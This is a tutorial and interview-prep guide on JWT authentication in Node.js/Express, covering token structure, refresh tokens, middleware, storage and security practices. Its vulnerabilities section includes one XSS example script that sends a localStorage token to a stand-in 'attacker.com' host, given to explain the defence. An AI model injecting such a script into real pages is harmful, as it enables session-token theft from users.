# JWT Authentication

## Overview

**JSON Web Token (JWT)** is a compact, self-contained way to securely transmit information between parties as a JSON object. It's the most popular authentication mechanism for modern web applications and RESTful APIs.

**Key Principle:** Stateless authentication where the server doesn't need to store session data—the token itself contains all necessary information.

---

## 🔑 What is JWT?

### JWT Structure

A JWT consists of three parts separated by dots (`.`):

```
header.payload.signature
```

**Example JWT:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjM0NSIsImVtYWlsIjoiam9obkBleGFtcGxlLmNvbSIsImlhdCI6MTYxNjIzOTAyMiwiZXhwIjoxNjE2MjQyNjIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

### Parts Breakdown

**1. Header**
```json
{
  "alg": "HS256",      // Hashing algorithm
  "typ": "JWT"         // Token type
}
```

**2. Payload (Claims)**
```json
{
  "userId": "12345",
  "email": "john@example.com",
  "role": "admin",
  "iat": 1616239022,   // Issued at
  "exp": 1616242622    // Expiration
}
```

**3. Signature**
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

---

## 🛠 Implementation

### Installation

```bash
npm install jsonwebtoken bcryptjs express
```

### Basic JWT Generation & Verification

```javascript
const jwt = require('jsonwebtoken');

// Environment variable for secret key
const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key';

// Generate JWT
function generateToken(userId, email, role) {
  const payload = {
    userId,
    email,
    role,
  };

  const options = {
    expiresIn: '15m',  // Access token expires in 15 minutes
  };

  return jwt.sign(payload, JWT_SECRET, options);
}

// Verify JWT
function verifyToken(token) {
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    return { valid: true, decoded };
  } catch (error) {
    return { valid: false, error: error.message };
  }
}

// Usage
const token = generateToken('12345', 'john@example.com', 'admin');
console.log('Token:', token);

const result = verifyToken(token);
if (result.valid) {
  console.log('User ID:', result.decoded.userId);
} else {
  console.log('Invalid token:', result.error);
}
```

---

## 🔐 Complete Authentication System

### User Registration

```javascript
const express = require('express');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const User = require('./models/User');

const app = express();
app.use(express.json());

const JWT_SECRET = process.env.JWT_SECRET;
const JWT_REFRESH_SECRET = process.env.JWT_REFRESH_SECRET;

// Register new user
app.post('/auth/register', async (req, res) => {
  try {
    const { email, password, name } = req.body;

    // Validate input
    if (!email || !password || password.length < 6) {
      return res.status(400).json({
        error: 'Invalid input. Password must be at least 6 characters.'
      });
    }

    // Check if user exists
    const existingUser = await User.findOne({ email });
    if (existingUser) {
      return res.status(409).json({ error: 'Email already registered' });
    }

    // Hash password
    const hashedPassword = await bcrypt.hash(password, 10);

    // Create user
    const user = await User.create({
      email,
      password: hashedPassword,
      name,
    });

    // Generate tokens
    const accessToken = generateAccessToken(user._id, user.email, user.role);
    const refreshToken = generateRefreshToken(user._id);

    // Save refresh token to database
    user.refreshToken = refreshToken;
    await user.save();

    res.status(201).json({
      message: 'User registered successfully',
      accessToken,
      refreshToken,
      user: {
        id: user._id,
        email: user.email,
        name: user.name,
      },
    });
  } catch (error) {
    res.status(500).json({ error: 'Registration failed' });
  }
});
```

### User Login

```javascript
// Login user
app.post('/auth/login', async (req, res) => {
  try {
    const { email, password } = req.body;

    // Find user
    const user = await User.findOne({ email });
    if (!user) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    // Verify password
    const isValidPassword = await bcrypt.compare(password, user.password);
    if (!isValidPassword) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    // Generate tokens
    const accessToken = generateAccessToken(user._id, user.email, user.role);
    const refreshToken = generateRefreshToken(user._id);

    // Update refresh token in database
    user.refreshToken = refreshToken;
    await user.save();

    res.json({
      accessToken,
      refreshToken,
      user: {
        id: user._id,
        email: user.email,
        name: user.name,
        role: user.role,
      },
    });
  } catch (error) {
    res.status(500).json({ error: 'Login failed' });
  }
});
```

### Token Generation Functions

```javascript
// Access Token (short-lived)
function generateAccessToken(userId, email, role) {
  return jwt.sign(
    { userId, email, role },
    JWT_SECRET,
    { expiresIn: '15m' }  // 15 minutes
  );
}

// Refresh Token (long-lived)
function generateRefreshToken(userId) {
  return jwt.sign(
    { userId },
    JWT_REFRESH_SECRET,
    { expiresIn: '7d' }  // 7 days
  );
}
```

---

## 🛡️ Authentication Middleware

### Protect Routes with Middleware

```javascript
// Authentication middleware
const authenticate = async (req, res, next) => {
  try {
    // Get token from header
    const authHeader = req.headers.authorization;

    if (!authHeader || !authHeader.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'No token provided' });
    }

    const token = authHeader.replace('Bearer ', '');

    // Verify token
    const decoded = jwt.verify(token, JWT_SECRET);

    // Attach user to request
    req.user = decoded;

    next();
  } catch (error) {
    if (error.name === 'TokenExpiredError') {
      return res.status(401).json({ error: 'Token expired' });
    }
    if (error.name === 'JsonWebTokenError') {
      return res.status(401).json({ error: 'Invalid token' });
    }
    res.status(500).json({ error: 'Authentication failed' });
  }
};

// Usage: Protect routes
app.get('/profile', authenticate, async (req, res) => {
  try {
    const user = await User.findById(req.user.userId).select('-password');
    res.json(user);
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch profile' });
  }
});

app.put('/profile', authenticate, async (req, res) => {
  try {
    const { name } = req.body;
    const user = await User.findByIdAndUpdate(
      req.user.userId,
      { name },
      { new: true }
    ).select('-password');

    res.json(user);
  } catch (error) {
    res.status(500).json({ error: 'Failed to update profile' });
  }
});
```

### Role-Based Authorization

```javascript
// Authorization middleware - checks user role
const authorize = (...allowedRoles) => {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ error: 'Not authenticated' });
    }

    if (!allowedRoles.includes(req.user.role)) {
      return res.status(403).json({
        error: 'Forbidden: Insufficient permissions'
      });
    }

    next();
  };
};

// Usage: Admin-only route
app.delete('/users/:id',
  authenticate,
  authorize('admin'),
  async (req, res) => {
    try {
      await User.findByIdAndDelete(req.params.id);
      res.json({ message: 'User deleted successfully' });
    } catch (error) {
      res.status(500).json({ error: 'Failed to delete user' });
    }
  }
);

// Usage: Multiple roles allowed
app.post('/posts',
  authenticate,
  authorize('admin', 'editor'),
  async (req, res) => {
    // Only admins and editors can create posts
    // Implementation...
  }
);
```

---

## 🔄 Refresh Token Implementation

### Token Refresh Endpoint

```javascript
// Refresh access token
app.post('/auth/refresh', async (req, res) => {
  try {
    const { refreshToken } = req.body;

    if (!refreshToken) {
      return res.status(401).json({ error: 'Refresh token required' });
    }

    // Verify refresh token
    const decoded = jwt.verify(refreshToken, JWT_REFRESH_SECRET);

    // Find user and validate refresh token
    const user = await User.findById(decoded.userId);
    if (!user || user.refreshToken !== refreshToken) {
      return res.status(401).json({ error: 'Invalid refresh token' });
    }

    // Generate new access token
    const newAccessToken = generateAccessToken(
      user._id,
      user.email,
      user.role
    );

    res.json({ accessToken: newAccessToken });
  } catch (error) {
    if (error.name === 'TokenExpiredError') {
      return res.status(401).json({
        error: 'Refresh token expired. Please login again.'
      });
    }
    res.status(401).json({ error: 'Invalid refresh token' });
  }
});
```

### Logout (Token Invalidation)

```javascript
// Logout - invalidate refresh token
app.post('/auth/logout', authenticate, async (req, res) => {
  try {
    // Remove refresh token from database
    await User.findByIdAndUpdate(req.user.userId, {
      refreshToken: null,
    });

    res.json({ message: 'Logged out successfully' });
  } catch (error) {
    res.status(500).json({ error: 'Logout failed' });
  }
});
```

---

## 📦 Token Storage (Frontend)

### localStorage vs httpOnly Cookies

```javascript
// ❌ BAD: Storing JWT in localStorage (vulnerable to XSS)
localStorage.setItem('token', accessToken);

// ✅ GOOD: Store in httpOnly cookie (server-side)
app.post('/auth/login', async (req, res) => {
  // ... authentication logic ...

  // Set httpOnly cookie
  res.cookie('accessToken', accessToken, {
    httpOnly: true,      // Cannot be accessed by JavaScript
    secure: true,        // Only sent over HTTPS
    sameSite: 'strict',  // CSRF protection
    maxAge: 15 * 60 * 1000,  // 15 minutes
  });

  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000,  // 7 days
  });

  res.json({ message: 'Login successful' });
});

// Middleware to extract token from cookie
const authenticateFromCookie = (req, res, next) => {
  const token = req.cookies.accessToken;

  if (!token) {
    return res.status(401).json({ error: 'Not authenticated' });
  }

  try {
    req.user = jwt.verify(token, JWT_SECRET);
    next();
  } catch (error) {
    res.status(401).json({ error: 'Invalid token' });
  }
};
```

---

## 🔒 Security Best Practices

### 1. Use Strong Secret Keys

```javascript
// ❌ BAD: Weak secret
const JWT_SECRET = 'secret123';

// ✅ GOOD: Strong random secret (generate with crypto)
const crypto = require('crypto');
const JWT_SECRET = crypto.randomBytes(64).toString('hex');
// Store in environment variable: process.env.JWT_SECRET
```

### 2. Set Appropriate Expiration Times

```javascript
// Access Token: Short-lived (15 minutes to 1 hour)
const accessToken = jwt.sign(payload, JWT_SECRET, { expiresIn: '15m' });

// Refresh Token: Long-lived (7 days to 30 days)
const refreshToken = jwt.sign(payload, JWT_REFRESH_SECRET, { expiresIn: '7d' });
```

### 3. Don't Store Sensitive Data in JWT

```javascript
// ❌ BAD: Storing sensitive data
const payload = {
  userId: user.id,
  password: user.password,      // Never!
  creditCard: user.creditCard,  // Never!
  ssn: user.ssn,                // Never!
};

// ✅ GOOD: Only necessary identifiers
const payload = {
  userId: user.id,
  email: user.email,
  role: user.role,
};
```

### 4. Implement Token Blacklisting (for logout)

```javascript
// Using Redis for blacklist
const redis = require('redis');
const client = redis.createClient();

// Logout - add token to blacklist
app.post('/auth/logout', authenticate, async (req, res) => {
  const token = req.headers.authorization.replace('Bearer ', '');
  const decoded = jwt.decode(token);
  const expiresIn = decoded.exp - Math.floor(Date.now() / 1000);

  // Add to blacklist with expiration
  await client.setex(`blacklist:${token}`, expiresIn, 'true');

  res.json({ message: 'Logged out successfully' });
});

// Middleware to check blacklist
const checkBlacklist = async (req, res, next) => {
  const token = req.headers.authorization?.replace('Bearer ', '');

  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }

  const isBlacklisted = await client.get(`blacklist:${token}`);

  if (isBlacklisted) {
    return res.status(401).json({ error: 'Token has been revoked' });
  }

  next();
};

// Use in protected routes
app.get('/profile', checkBlacklist, authenticate, (req, res) => {
  // ...
});
```

### 5. Validate Token Algorithm

```javascript
// ✅ GOOD: Specify allowed algorithms
const decoded = jwt.verify(token, JWT_SECRET, {
  algorithms: ['HS256'],  // Prevent 'none' algorithm attack
});
```

---

## ⚖️ JWT vs Sessions

| Feature | JWT | Sessions |
|---------|-----|----------|
| **Storage** | Client-side (token) | Server-side (session store) |
| **Scalability** | ✅ Stateless, scales easily | ❌ Requires shared session store |
| **Performance** | ✅ No DB lookup needed | ❌ DB lookup for each request |
| **Security** | ⚠️ Can't be invalidated easily | ✅ Easy to invalidate |
| **Size** | ❌ Larger (sent with each request) | ✅ Smaller (only session ID) |
| **Cross-domain** | ✅ Easy to use across domains | ❌ CORS complications |
| **Revocation** | ❌ Difficult (needs blacklist) | ✅ Easy (delete from store) |

### When to Use JWT

✅ Microservices architecture
✅ Mobile applications
✅ Single Page Applications (SPAs)
✅ Third-party API access
✅ Stateless authentication

### When to Use Sessions

✅ Traditional server-rendered apps
✅ Need instant token revocation
✅ Storing large amounts of user data
✅ Simpler security requirements

---

## 🚨 Common Vulnerabilities

### 1. XSS (Cross-Site Scripting)

**Attack:** Steal JWT from localStorage
```javascript
// Attacker injects script
<script>
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'));
</script>
```

**Prevention:**
- Store tokens in httpOnly cookies (not localStorage)
- Sanitize all user input
- Use Content Security Policy (CSP)

### 2. CSRF (Cross-Site Request Forgery)

**Attack:** Make unauthorized requests using victim's cookies

**Prevention:**
```javascript
// Use sameSite cookie attribute
res.cookie('token', token, {
  httpOnly: true,
  sameSite: 'strict',  // or 'lax'
  secure: true,
});

// Add CSRF token for state-changing operations
```

### 3. Algorithm None Attack

**Attack:** Change algorithm to 'none' to bypass signature verification

**Prevention:**
```javascript
// Always specify allowed algorithms
jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'] });
```

### 4. Weak Secret Key

**Attack:** Brute force or crack weak secrets

**Prevention:**
```javascript
// Use strong, random secret (minimum 256 bits)
const JWT_SECRET = crypto.randomBytes(64).toString('hex');
```

---

## 📚 Interview Questions

### Q1: What is JWT and how does it work?

**Answer:**
JWT (JSON Web Token) is a compact, self-contained token used for securely transmitting information between parties. It consists of three parts:

1. **Header**: Contains the algorithm and token type
2. **Payload**: Contains claims (user data, expiration, etc.)
3. **Signature**: Ensures the token hasn't been tampered with

**How it works:**
1. User logs in with credentials
2. Server validates credentials and generates a JWT
3. Server sends JWT to client
4. Client stores JWT and includes it in subsequent requests (Authorization header)
5. Server verifies JWT signature and extracts user information
6. Server processes request if token is valid

The signature is created by encoding the header and payload with a secret key using HMAC or RSA. This ensures that if anyone modifies the token, the signature won't match, and the token will be rejected.

**Example:**
```javascript
// Login generates token
const token = jwt.sign({ userId: user.id }, SECRET, { expiresIn: '1h' });

// Every request includes token
headers: { Authorization: 'Bearer eyJhbGc...' }

// Server verifies on each request
const decoded = jwt.verify(token, SECRET);
```

---

### Q2: What's the difference between access tokens and refresh tokens?

**Answer:**

**Access Token:**
- **Purpose**: Used to access protected resources
- **Lifetime**: Short (15 minutes to 1 hour)
- **Storage**: Can be in memory or httpOnly cookie
- **Contains**: User ID, email, role, permissions
- **Security**: Less risky if stolen due to short lifetime

**Refresh Token:**
- **Purpose**: Used to obtain new access tokens
- **Lifetime**: Long (7 to 30 days)
- **Storage**: httpOnly cookie or secure database
- **Contains**: Only user ID (minimal data)
- **Security**: More sensitive, often stored in database for revocation

**Why use both?**
- **Security**: If access token is stolen, it expires quickly
- **User Experience**: User doesn't need to re-login frequently
- **Revocation**: Can invalidate refresh tokens in database for immediate logout

**Implementation:**
```javascript
// Generate both tokens on login
const accessToken = jwt.sign(
  { userId, email, role },
  SECRET,
  { expiresIn: '15m' }
);

const refreshToken = jwt.sign(
  { userId },
  REFRESH_SECRET,
  { expiresIn: '7d' }
);

// When access token expires, use refresh token
app.post('/auth/refresh', (req, res) => {
  const { refreshToken } = req.body;
  const decoded = jwt.verify(refreshToken, REFRESH_SECRET);

  // Verify refresh token is still valid in database
  const user = await User.findById(decoded.userId);
  if (user.refreshToken !== refreshToken) {
    return res.status(401).json({ error: 'Invalid refresh token' });
  }

  // Issue new access token
  const newAccessToken = jwt.sign(
    { userId: user.id, email: user.email, role: user.role },
    SECRET,
    { expiresIn: '15m' }
  );

  res.json({ accessToken: newAccessToken });
});
```

---

### Q3: How do you invalidate/revoke a JWT token?

**Answer:**

JWTs are stateless, so they can't be invalidated on the server by default. However, there are several approaches:

**1. Token Blacklisting (Recommended)**
```javascript
// Store revoked tokens in Redis with expiration
const redis = require('redis');
const client = redis.createClient();

// On logout
app.post('/logout', authenticate, async (req, res) => {
  const token = req.headers.authorization.replace('Bearer ', '');
  const decoded = jwt.decode(token);
  const expiresIn = decoded.exp - Math.floor(Date.now() / 1000);

  // Add to blacklist
  await client.setex(`blacklist:${token}`, expiresIn, 'true');
  res.json({ message: 'Logged out' });
});

// Check blacklist on every request
const checkBlacklist = async (req, res, next) => {
  const token = req.headers.authorization?.replace('Bearer ', '');
  const isBlacklisted = await client.get(`blacklist:${token}`);

  if (isBlacklisted) {
    return res.status(401).json({ error: 'Token revoked' });
  }
  next();
};
```

**2. Short Expiration + Refresh Tokens**
```javascript
// Access tokens expire quickly (15 min)
// Refresh tokens stored in database can be deleted
await User.findByIdAndUpdate(userId, { refreshToken: null });
```

**3. Token Versioning**
```javascript
// Add version number to user model
const userSchema = new Schema({
  tokenVersion: { type: Number, default: 0 },
});

// Include in JWT
const token = jwt.sign(
  { userId, tokenVersion: user.tokenVersion },
  SECRET
);

// Verify version matches
const decoded = jwt.verify(token, SECRET);
const user = await User.findById(decoded.userId);

if (user.tokenVersion !== decoded.tokenVersion) {
  return res.status(401).json({ error: 'Token revoked' });
}

// Invalidate all tokens for user
await User.findByIdAndUpdate(userId, { $inc: { tokenVersion: 1 } });
```

**Trade-offs:**
- Blacklisting: Requires storage and lookup (loses stateless benefit)
- Short expiration: Good UX with refresh tokens
- Versioning: Requires DB lookup (common for sensitive operations)

---

### Q4: Where should you store JWT tokens on the client side?

**Answer:**

**Options and Security Implications:**

**1. localStorage** ❌ Not Recommended
```javascript
// Vulnerable to XSS attacks
localStorage.setItem('token', token);
```
- **Pros**: Easy to implement, persists across tabs
- **Cons**: Accessible by any JavaScript (XSS vulnerability)
- **Use case**: Low-security applications only

**2. sessionStorage** ❌ Not Recommended
```javascript
sessionStorage.setItem('token', token);
```
- **Pros**: Cleared when tab closes
- **Cons**: Still vulnerable to XSS
- **Use case**: Temporary tokens for single session

**3. httpOnly Cookies** ✅ Recommended
```javascript
// Server sets cookie
res.cookie('token', token, {
  httpOnly: true,      // Cannot be accessed by JavaScript
  secure: true,        // Only sent over HTTPS
  sameSite: 'strict',  // CSRF protection
  maxAge: 900000,      // 15 minutes
});
```
- **Pros**: Not accessible by JavaScript, automatic with requests, CSRF protection with sameSite
- **Cons**: Requires CORS configuration, more complex setup
- **Use case**: Most production applications

**4. Memory (React state/Redux)** ✅ Good for Access Tokens
```javascript
// Store in component state or Redux
const [token, setToken] = useState(null);
```
- **Pros**: Lost on page refresh (most secure), not vulnerable to XSS
- **Cons**: Lost on page refresh, requires refresh token strategy
- **Use case**: Access tokens with refresh token in httpOnly cookie

**Best Practice Approach:**
```javascript
// Access token in memory (React state)
// Refresh token in httpOnly cookie

// Login response
res.cookie('refreshToken', refreshToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 7 * 24 * 60 * 60 * 1000,  // 7 days
});

res.json({ accessToken });  // Send access token in response body

// Client stores access token in memory
const [accessToken, setAccessToken] = useState(null);

// On page refresh, use refresh token to get new access token
useEffect(() => {
  fetch('/auth/refresh', {
    credentials: 'include'  // Sends httpOnly cookie
  })
    .then(res => res.json())
    .then(data => setAccessToken(data.accessToken));
}, []);
```

---

### Q5: What are the main security considerations when implementing JWT authentication?

**Answer:**

**1. Secret Key Management**
```javascript
// ❌ BAD
const SECRET = 'mysecret';

// ✅ GOOD
const SECRET = process.env.JWT_SECRET;  // Strong random key in env
```

**2. HTTPS Only**
```javascript
// Always use HTTPS in production
res.cookie('token', token, {
  secure: process.env.NODE_ENV === 'production',  // HTTPS only
});
```

**3. Short Expiration Times**
```javascript
// Access tokens: 15 min to 1 hour
const accessToken = jwt.sign(payload, SECRET, { expiresIn: '15m' });

// Refresh tokens: 7 to 30 days
const refreshToken = jwt.sign(payload, REFRESH_SECRET, { expiresIn: '7d' });
```

**4. Don't Store Sensitive Data**
```javascript
// ❌ Never include sensitive data
{ password: 'secret123', ssn: '123-45-6789' }

// ✅ Only identifiers
{ userId: '123', email: 'user@example.com', role: 'user' }
```

**5. Validate Algorithm**
```javascript
// ✅ Prevent "none" algorithm attack
jwt.verify(token, SECRET, { algorithms: ['HS256'] });
```

**6. Implement Rate Limiting**
```javascript
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 5,  // 5 requests per window
  message: 'Too many login attempts',
});

app.post('/auth/login', loginLimiter, loginHandler);
```

**7. Token Rotation**
```javascript
// Issue new refresh token periodically
app.post('/auth/refresh', async (req, res) => {
  // ... verify old refresh token ...

  const newAccessToken = generateAccessToken(user);
  const newRefreshToken = generateRefreshToken(user);

  // Invalidate old refresh token
  user.refreshToken = newRefreshToken;
  await user.save();

  res.json({ accessToken: newAccessToken, refreshToken: newRefreshToken });
});
```

**8. Input Validation**
```javascript
// Validate all inputs before processing
const { email, password } = req.body;

if (!email || !email.match(/^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$/)) {
  return res.status(400).json({ error: 'Invalid email' });
}

if (!password || password.length < 8) {
  return res.status(400).json({ error: 'Password must be at least 8 characters' });
}
```

**9. Monitor for Suspicious Activity**
```javascript
// Log failed login attempts
const failedAttempts = new Map();

app.post('/auth/login', async (req, res) => {
  const { email, password } = req.body;

  // Track failed attempts
  if (failedAttempts.get(email) >= 5) {
    // Lock account or require CAPTCHA
    return res.status(429).json({ error: 'Account locked' });
  }

  // ... authentication logic ...

  if (!isValidPassword) {
    failedAttempts.set(email, (failedAttempts.get(email) || 0) + 1);
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Reset on success
  failedAttempts.delete(email);
});
```

---

## ✅ Best Practices Summary

### ✅ Do's

1. **Use strong, random secret keys** (minimum 256 bits)
2. **Store tokens in httpOnly cookies** (not localStorage)
3. **Implement short-lived access tokens** (15 min to 1 hour)
4. **Use refresh tokens** for better UX and security
5. **Validate token algorithms** (prevent "none" attack)
6. **Implement rate limiting** on auth endpoints
7. **Use HTTPS** in production always
8. **Rotate refresh tokens** periodically
9. **Implement proper error handling** (don't leak info)
10. **Monitor and log** authentication events

### ❌ Don'ts

1. **Don't store sensitive data in JWT** (passwords, SSN, credit cards)
2. **Don't use weak secrets** (like 'secret123')
3. **Don't store JWTs in localStorage** (XSS risk)
4. **Don't make tokens too long-lived** (security risk)
5. **Don't trust the client** (always verify on server)
6. **Don't expose secret keys** (use environment variables)
7. **Don't skip input validation**
8. **Don't use HTTP in production** (HTTPS only)
9. **Don't ignore token expiration** (always check)
10. **Don't forget to handle edge cases** (expired, malformed tokens)

---

## 🎯 Summary

- **JWT** is a stateless, self-contained token for authentication
- **Structure**: Header.Payload.Signature (all Base64 encoded)
- **Access tokens** are short-lived, **refresh tokens** are long-lived
- **Storage**: Use httpOnly cookies or in-memory storage
- **Security**: Strong secrets, HTTPS, short expiration, input validation
- **Revocation**: Implement blacklisting or token versioning
- **Best for**: Microservices, SPAs, mobile apps, APIs
- **Trade-offs**: Can't be easily revoked vs. sessions, but scales better

---

[← Back to Backend](../README.md) | [Next: OAuth 2.0 →](./02-oauth.md)
